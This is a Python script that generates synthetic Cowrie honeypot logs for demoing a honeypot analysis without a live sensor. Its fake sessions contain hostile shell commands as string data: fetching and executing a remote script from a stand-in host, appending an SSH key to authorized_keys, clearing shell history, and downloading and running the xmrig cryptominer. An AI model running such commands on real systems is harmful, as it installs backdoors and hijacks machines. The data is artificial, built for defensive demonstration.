"""Creates sample_cowrie.json (fake Cowrie-style logs) so you can demo without a live honeypot."""
import json
def ev(sid, ip, ts, eid, **kw): return json.dumps({"session": sid, "src_ip": ip, "timestamp": ts, "eventid": eid, **kw})
L = []
# Session 1: brute force -> login -> recon -> malware download -> persistence
ip = "203.0.113.45"; s = "a1"
for i, (u, p) in enumerate([("root","123456"),("root","admin"),("admin","admin"),("root","password"),("ubnt","ubnt"),("root","toor")]):
    L.append(ev(s, ip, f"2026-09-20T02:00:{i:02d}Z", "cowrie.login.failed", username=u, password=p))
L.append(ev(s, ip, "2026-09-20T02:00:10Z", "cowrie.login.success", username="root", password="root"))
for j, c in enumerate(["uname -a","whoami","cat /proc/cpuinfo","cd /tmp; wget http://198.51.100.9/x.sh; chmod +x x.sh; ./x.sh",
                       "echo 'ssh-rsa AAAA... bot' >> ~/.ssh/authorized_keys","history -c"]):
    L.append(ev(s, ip, f"2026-09-20T02:01:{j:02d}Z", "cowrie.command.input", input=c))
L.append(ev(s, ip, "2026-09-20T02:01:30Z", "cowrie.session.file_download", url="http://198.51.100.9/x.sh"))
# Session 2: brute force only
ip = "192.0.2.77"; s = "b2"
for i in range(12):
    L.append(ev(s, ip, f"2026-09-20T05:10:{i:02d}Z", "cowrie.login.failed", username="root", password=f"pass{i}"))
# Session 3: login, quick recon, cryptominer
ip = "198.51.100.23"; s = "c3"
L.append(ev(s, ip, "2026-09-21T11:00:00Z", "cowrie.login.success", username="admin", password="admin"))
for j, c in enumerate(["lscpu","curl -s http://203.0.113.200/xmrig -o /tmp/xmrig","/tmp/xmrig -o stratum+tcp://pool.example:3333"]):
    L.append(ev(s, ip, f"2026-09-21T11:00:{j+1:02d}Z", "cowrie.command.input", input=c))
open("sample_cowrie.json", "w").write("\n".join(L))
print("wrote sample_cowrie.json")
